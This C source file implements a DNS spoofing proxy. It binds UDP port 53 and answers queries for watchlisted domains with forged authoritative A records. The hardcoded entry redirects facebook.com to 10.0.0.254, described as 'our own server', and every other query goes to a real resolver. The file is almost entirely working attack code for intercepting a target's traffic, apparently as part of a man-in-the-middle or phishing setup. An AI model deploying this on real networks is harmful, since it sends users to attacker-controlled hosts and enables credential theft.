#include "dns_proxy.h"
#include "dns_parser.h"
#include "host_table.h"
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static struct host watchlist[WATCHLIST_LEN] = {0};

int create_dns_socket() {
  struct sockaddr_in listening = {0};
  listening.sin_addr.s_addr = inet_addr("0.0.0.0");
  listening.sin_port = htons(53);
  listening.sin_family = AF_INET;
  int sfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sfd == -1) {
    fprintf(stderr, "[!] Failed to create socket for listening : %s\n",
            strerror(errno));
    return -1;
  }

  if (bind(sfd, (struct sockaddr *)&listening, sizeof(struct sockaddr_in)) ==
      -1) {
    fprintf(stderr, "[!] Failed to bind to port 53 : %s\n", strerror(errno));
    return -1;
  }

  return sfd;
}

int forward_request(struct dns_packet request, int request_size, char *answer) {
  int sfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

  if (sfd == -1) {
    fprintf(stderr, "[!] Could not open socket to resolve address : %s\n",
            strerror(errno));
    return -1;
  }

  struct addrinfo addressbook = {0};
  struct addrinfo *addresses = &addressbook;
  struct addrinfo hints = {0};
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_DGRAM;
  hints.ai_flags = AI_PASSIVE;

  if (getaddrinfo(DNS_SERVER_IP, "53", &hints, &addresses) != 0) {
    fprintf(stderr, "[!] Could not resolve address : %s\n", strerror(errno));
    return -1;
  }

  struct addrinfo *working_address;
  for (working_address = addresses; working_address != NULL;
       working_address = working_address->ai_next) {
    if (connect(sfd, working_address->ai_addr, working_address->ai_addrlen) ==
        0) {
      // Successfully started a "connection" (completely fictionnal since this
      // is UDP) with the DNS server.
      break;
    }
  }

  freeaddrinfo(addresses);

  if (working_address == NULL) {
    fprintf(stderr, "[!] No route available to DNS server...\n");
    close(sfd);
    return -1;
  }

  /*Now, let's forward the request to the server*/

  if (send(sfd, &request, request_size, 0) == -1) {
    fprintf(stderr, "[!] Failed to forward DNS request : %s\n",
            strerror(errno));
    close(sfd);
    return -1;
  }

  /*And receive an answer*/
  /*Adding a timeout (from experience...)*/
  struct timeval tv;
  tv.tv_sec = 3;
  tv.tv_usec = 0;
  if (setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) == -1) {
    fprintf(stderr, "[!] Failed to set socket timeout : %s\n", strerror(errno));
    close(sfd);
    return -1;
  }
  int received = recv(sfd, answer, DNS_BUFFER_SIZE, MSG_TRUNC);
  if (received == -1) {
    fprintf(stderr, "[!] Failed to read answer : %s\n", strerror(errno));
    close(sfd);
    return -1;
  } // And that's it for the forwarding !

  return received;
}

int process_request(struct dns_packet request, int request_size,
                    struct dns_packet *answer) {
  if (get_qr(&request.dnshdr.flags)) {
    fprintf(
        stderr,
        "[!] DNS message is NOT a request, something fishy is going on...\n");
    return -1;
  }

  char host[DOMAIN_MAX_LENGTH];
  if (read_hostname(request, host, DOMAIN_MAX_LENGTH) == -1) {
    fprintf(stderr, "[!] Unable to read hostname from request !\n");
    return -1;
  }
  struct host target_domain = {0};
  if (get_host(watchlist, host, &target_domain) == 0) {
    /*
     *  Intercept the query, and return a forged one
     * */
    int answer_size = DNS_HEADER_SIZE;
    printf(
        "[+] Target has requested a host on the watchlist, intercepting. \n");
    memcpy(answer, &request, request_size);

    /*Looking for the QTYPE of the request*/
    char *qtype_ptr = answer->content;
    while (*qtype_ptr != 0x00)
      qtype_ptr++;
    qtype_ptr++; /* skipping 0x00 */
    uint16_t qtype = ntohs(*(uint16_t *)qtype_ptr);

    if (qtype == 0x001c) {
      /*AAAA is unhandled so sending back nothing*/
      set_qr(1, &answer->dnshdr.flags);
      set_aa(1, &answer->dnshdr.flags);
      set_rcode(3, &answer->dnshdr.flags);
      answer->dnshdr.ancount = 0;
      return request_size;
    }

    set_qr(1, &answer->dnshdr.flags);
    set_aa(1, &answer->dnshdr.flags);
    /*First let's go to the end of the request*/
    char *answer_section = answer->content;
    for (; *answer_section != 0x00; answer_section++) {
      /*This gets us to the end of the QNAME part of the question section, and
       * ready to write our answer*/
      answer_size++;
    }

    answer_section += 5;
    answer_size += 5;

    // From here on, we start writing the DNS answer :
    /*    0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA (variable size !!!) /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+*/

    /* We will be using compression for the hostname*/
    *answer_section = 0xC0;
    answer_section++;
    *answer_section = 0x0C;
    answer_section++;

    /*Type*/
    *(u_int16_t *)answer_section = htons(0x0001);
    answer_section += 2;

    /*Class*/
    *(u_int16_t *)answer_section = htons(0x0001);
    answer_section += 2;

    /*TTL*/
    *(u_int32_t *)answer_section = htonl(0x0000012C);
    answer_section += 4;

    /*RDLENGTH*/
    *(u_int16_t *)answer_section = htons(0x0004);
    answer_section += 2;

    /*RDATA*/
    *(u_int32_t *)answer_section = inet_addr(target_domain.ip);
    answer_section += 4;

    /*Setting the size*/
    answer_size += 16;

    /*Setting the ancount also*/
    answer->dnshdr.ancount = htons(1);

    return answer_size;

  } else {
    /*
     *  Use the actual DNS to send a request and resolve the domain name
     * */
    int response_size = forward_request(request, request_size, (char *)answer);
    if (response_size == -1) {
      fprintf(stderr, "[!] Forwarding failed...\n");
      return -1;
    }
    return response_size;
  }
}

void *run_dns_proxy(void *raw_args) {
  (void)raw_args; // Just because I hate those pesky yellow warnings
  int sfd = create_dns_socket();

  if (sfd == -1) {
    fprintf(stderr, "[!] Failed to start DNS proxy.\n");
    return NULL;
  }

  /*Setting up the watchlist to redirect facebook to our own server*/
  struct host fb = {"10.0.0.254", "facebook.com"};
  memcpy(&watchlist, &fb, sizeof(struct host));

  printf("[+] Started DNS proxy\n");

  struct dns_packet request = {0};
  struct sockaddr_in client;
  socklen_t client_length;
  int received;
  while ((received = recvfrom(sfd, &request, DNS_BUFFER_SIZE, 0,
                              (struct sockaddr *)&client, &client_length)) !=
         -1) {
    printf("[+] Received DNS request ! \n");
    struct dns_packet answer = {0};
    int answer_size = process_request(request, received, &answer);
    if (sendto(sfd, &answer, answer_size, 0, (struct sockaddr *)&client,
               client_length) == -1) {
      fprintf(stderr, "[!] Failed to send the answer : %s\n", strerror(errno));
    }
  }
  return NULL;
}
